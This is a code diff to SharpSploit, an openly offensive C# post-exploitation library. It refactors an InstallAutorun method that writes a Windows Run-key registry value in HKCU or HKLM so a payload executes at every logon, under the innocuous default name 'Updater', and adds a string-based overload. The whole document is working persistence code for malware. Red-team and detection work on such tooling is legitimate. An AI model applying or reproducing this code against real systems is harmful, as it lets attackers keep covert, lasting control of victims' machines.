@@ -3,7 +3,9 @@
 // License: BSD 3-Clause
 
 using System;
-using Microsoft.Win32;
+using Win = Microsoft.Win32;
+
+using SharpSploit.Enumeration;
 
 namespace SharpSploit.Persistence
 {
@@ -13,48 +15,41 @@ namespace SharpSploit.Persistence
     public class Autorun
     {
         /// <summary>
-        /// Creates an autorun value in HKCU or HKLM to execuate a payload.
+        /// Installs an autorun value in HKCU or HKLM to execute a payload.
         /// </summary>
         /// <author>Daniel Duggan (@_RastaMouse)</author>
-        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
+        /// <returns>True if execution succeeds, false otherwise.</returns>
+        /// <param name="TargetHive">Target hive to install autorun. CurrentUser or LocalMachine.</param>
+        /// <param name="Value">Value to set in the registry.</param>
         /// <param name="Name">Name for the registy value. Defaults to "Updater".</param>
-        /// <param name="Value">The registry value.</param>
-        /// <param name="TargetHive">The target hive. HKCU or HKLM.</param>
-        public static bool InstallAutorun(string Value, Hive TargetHive, string Name = "Updater")
+        public static bool InstallAutorun(Win.RegistryHive TargetHive, string Value, string Name = "Updater")
         {
             try
             {
-                RegistryKey key;
-
-                if (TargetHive == Hive.HKCU)
+                if (TargetHive == Win.RegistryHive.CurrentUser || TargetHive == Win.RegistryHive.LocalMachine)
                 {
-                    key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                    key.SetValue(Name, Value, RegistryValueKind.ExpandString);
-                    key.Close();
+                    return Registry.SetRegistryKey(TargetHive, @"Software\Microsoft\Windows\CurrentVersion\Run", Name, Value, Win.RegistryValueKind.ExpandString);
                 }
-                else if (TargetHive == Hive.HKLM)
-                {
-                    key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                    key.SetValue(Name, Value, RegistryValueKind.ExpandString);
-                    key.Close();
-                }
-
-                return true;
+                Console.Error.WriteLine("Error: TargetHive must be CurrentUser or LocalMachine.");
             }
-
             catch (Exception e)
             {
-                Console.Error.WriteLine("Error: ", e.Message);
+                Console.Error.WriteLine($"Error: {e.Message}");
             }
-
             return false;
-            
         }
 
-        public enum Hive
+        /// <summary>
+        /// Installs an autorun value in HKCU or HKLM to execute a payload.
+        /// </summary>
+        /// <author>Daniel Duggan (@_RastaMouse)</author>
+        /// <returns>True if execution succeeds, false otherwise.</returns>
+        /// <param name="TargetHive">Target hive to install autorun. CurrentUser or LocalMachine.</param>
+        /// <param name="Value">Value to set in the registry.</param>
+        /// <param name="Name">Name for the registy value. Defaults to "Updater".</param>
+        public static bool InstallAutorun(string TargetHive, string Value, string Name = "Updater")
         {
-            HKCU,
-            HKLM
+            return InstallAutorun(Registry.ConvertToRegistryHive(TargetHive), Value, Name);
         }
     }
 }
